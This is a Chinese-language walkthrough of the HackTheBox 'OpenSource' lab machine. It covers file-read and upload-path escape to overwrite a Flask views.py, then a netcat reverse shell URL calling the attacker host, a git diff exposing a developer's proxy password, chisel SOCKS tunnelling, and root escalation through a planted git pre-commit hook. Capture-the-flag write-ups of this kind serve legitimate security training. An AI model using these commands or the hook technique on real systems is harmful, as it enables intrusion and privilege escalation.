---
layer: article
title: hackthebox OpenSource
tags: pentest hackthebox Walkthrough 
---

靶机链接：<https://app.hackthebox.com/machines/OpenSource>

## 环境配置

| 名称             | IP           |
| ---------------- | ------------ |
| OpenSource       | 10.10.11.164 |
| Kali Linux       | 10.10.14.8   |
| My Ubuntu Server | 192.168.1.13 |

## 漏洞发现

### 任意文件读取

![1](https://static.iihack.com/hackthebox/machines/OpenSource/1.jpg)


### 文件上传目录逃逸


![2](https://static.iihack.com/hackthebox/machines/OpenSource/2.jpg)

测试环境测试后门

![3](https://static.iihack.com/hackthebox/machines/OpenSource/3.jpg)
测试环境上传成功


![4](https://static.iihack.com/hackthebox/machines/OpenSource/4.jpg)

views.py 文件覆写成功

![5](https://static.iihack.com/hackthebox/machines/OpenSource/5.jpg)

读取靶机views.py

![6](https://static.iihack.com/hackthebox/machines/OpenSource/6.jpg)

靶机覆写views.py

![7](https://static.iihack.com/hackthebox/machines/OpenSource/7.jpg)



读取覆写后的views.py

![8](https://static.iihack.com/hackthebox/machines/OpenSource/8.jpg)



反弹shell

```http
http://10.10.11.164/shell?cmd=nc 10.10.14.8 444 -e /bin/sh
```

获得docker容器root权限

![9](https://static.iihack.com/hackthebox/machines/OpenSource/9.jpg)

源码包本地查看日志，对比文件

```bash
$ git checkout dev
$ git diff c41fedef2ec6df98735c11b2faf1e79ef492a0f3 a76f8f75f7a4a12b706b0cf9c983796fa1985820
diff --git a/.gitignore b/.gitignore
deleted file mode 100644
index e50a290..0000000
--- a/.gitignore
+++ /dev/null
@@ -1,26 +0,0 @@
-.DS_Store
-.env
-.flaskenv
-*.pyc
-*.pyo
-env/
-venv/
-.venv/
-env*
-dist/
-build/
-*.egg
-*.egg-info/
-_mailinglist
-.tox/
-.cache/
-.pytest_cache/
-.idea/
-docs/_build/
-.vscode
-
-# Coverage reports
-htmlcov/
-.coverage
-.coverage.*
-*,cover
diff --git a/Dockerfile b/Dockerfile
index 0875eda..76c7768 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -29,7 +29,7 @@ ENV PYTHONDONTWRITEBYTECODE=1
 
 # Set mode
 ENV MODE="PRODUCTION"
-ENV FLASK_DEBUG=1
+# ENV FLASK_DEBUG=1
 
 # Run supervisord
 CMD ["/usr/bin/supervisord", "-c", "/etc/supervisord.conf"]
diff --git a/app/.vscode/settings.json b/app/.vscode/settings.json
new file mode 100644
index 0000000..5975e3f
--- /dev/null
+++ b/app/.vscode/settings.json
@@ -0,0 +1,5 @@
+{
+  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
+  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
+  "http.proxyStrictSSL": false
+}

```

发现用户名密码

在容器内使用[chisel](https://www.iihack.com/pages/tools/chisel.html)开socks5代理


```bash
┌──(kali㉿kali)-[~/]
└─$ sudo ./chisel_1.7.7_linux_amd64 server --port 3000 -v --reverse --socks5

┌──(vict㉿target)-[~/tmp]
└─$ ./chisel_1.7.7_linux_amd64 client 10.10.14.8:3000 R:5000:socks

```

![10](https://static.iihack.com/hackthebox/machines/OpenSource/10.jpg)

![11](https://static.iihack.com/hackthebox/machines/OpenSource/11.jpg)



## 提权

![12](https://static.iihack.com/hackthebox/machines/OpenSource/12.jpg)







参考<https://www.mehmetince.net/one-git-command-may-cause-you-hacked-cve-2014-9390-exploitation-for-shell/>

写入文件

```bash
$ cat /home/dev01/.git/hooks/pre-commit

#!/bin/bash
touch /tmp/te
/usr/bin/python3 /tmp/r555.py
```





```bash
$ chmod +x  /home/dev01/.git/hooks/pre-commit
```



等定时任务执行，获得root shell成功

![13](https://static.iihack.com/hackthebox/machines/OpenSource/13.jpg)
